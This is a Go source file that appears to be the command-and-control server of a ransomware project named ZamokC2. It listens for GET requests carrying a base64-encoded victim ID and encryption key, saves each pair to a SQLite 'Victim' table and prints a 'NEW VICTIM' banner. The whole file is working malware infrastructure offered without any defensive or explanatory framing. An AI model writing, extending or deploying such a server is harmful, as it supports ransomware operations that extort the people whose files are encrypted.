package main

import (
	"ZamokC2/models"
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/gorilla/mux"
	"github.com/joho/godotenv"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
)

type Victim models.Victim

var db *gorm.DB

func initDB() {
	db_name := os.Getenv("DB_NAME")
	db, _ = gorm.Open(sqlite.Open(db_name), &gorm.Config{})
	db.Migrator().AutoMigrate(Victim{})
}

func newVictimBanner(id, key string) {
	fmt.Printf("\033[32m[+] NEW VICTIM [+]\n")
	fmt.Printf("\t\033[32mId : \033[34m%s\033[0m", id)
	fmt.Printf("\t\033[32mKey : \033[34m%s\033[0m\n", key)
}

func newVictim(w http.ResponseWriter, r *http.Request) {
	var victim Victim
	params := mux.Vars(r)
	info := params["info"]
	infoD, _ := base64.RawStdEncoding.DecodeString(info)
	info = string(infoD)
	sections := strings.Split(info, ":")
	id := sections[0]	
	key := sections[1]
	victim.UniqueID = id
	victim.Key = key
	db.Create(victim)
	newVictimBanner(id, key)
}

func main() {
	err := godotenv.Load()
	if err != nil {
		panic(err.Error())
	}
	initDB()
	router := mux.NewRouter()

	router.HandleFunc("/{info}", newVictim).Methods("GET")

	PORT := os.Getenv("PORT")
	fmt.Printf("\033[34m\n[*] C2 listening on port %s ... \n\n", PORT)
	http.ListenAndServe(PORT, router)
}
